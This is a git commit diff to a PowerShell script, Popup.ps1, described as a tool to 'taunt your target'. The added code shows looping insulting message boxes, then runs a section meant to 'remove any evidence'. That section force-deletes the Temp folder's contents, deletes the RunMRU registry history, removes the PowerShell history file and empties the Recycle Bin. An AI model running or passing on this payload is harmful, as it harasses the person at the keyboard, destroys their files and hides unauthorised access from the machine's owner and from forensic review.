c6a153065d24cd6157a21889a73ffeee5d738ca0
H0wler <109473380+H0wl3r@users.noreply.github.com>
2024-01-23 22:49:23 +0000

    Update Popup.ps1

--- Popup.ps1
+++ Popup.ps1
@@ -1,4 +1,52 @@
+
+Add-Type -AssemblyName System.Windows.Forms
+
+# The number of times you want it to cycle through your list of questions
+
+$cycles = 3
+
+# List as many questions here as you like, it will cycke through all of them
+
+$msgs = @(
+"If you select yes you are dumb"
+"Did you honestly select Yes?"
+"Thats twice!!! Are you really that dump?"
+"Select Yes for Dumb and No for Dumber"
+"Is your name DUMBO?"
+"Are you are proud of yourself?"
+"Does everyone else know how much you suck?"
+)
+
+for ($i=1; $i -le $cycles; $i++) {
+
+Foreach ($msg in $msgs) {
+[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Question')
+}
+}
+
+#----------------------------------------------------------------------------------------------------
+
 <#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue<#
 .SYNOPSIS
 	This script will open a series of pop ups in order to taunt your target. I wrote it initially to target call center scammers
 
